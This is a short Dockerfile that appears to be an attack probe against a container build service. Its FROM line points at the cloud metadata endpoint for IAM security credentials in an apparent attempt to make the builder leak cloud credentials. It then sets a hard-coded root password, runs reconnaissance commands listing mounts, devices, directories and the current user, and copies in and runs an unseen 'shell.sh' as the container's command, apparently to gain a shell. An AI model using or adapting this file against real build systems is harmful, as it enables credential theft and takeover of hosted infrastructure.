FROM http://169.254.169.254/latest/meta-data/iam/security-credentials/ 

#Run entry script
RUN echo "root:Docker!" | chpasswd
RUN mount
RUN ls -lah /dev
RUN pwd
RUN ls -lah /var
RUN ls -lah /var/lib
RUN whoami
COPY shell.sh /opt/shell.sh
RUN chmod +x /opt/shell.sh
CMD "/opt/shell.sh"
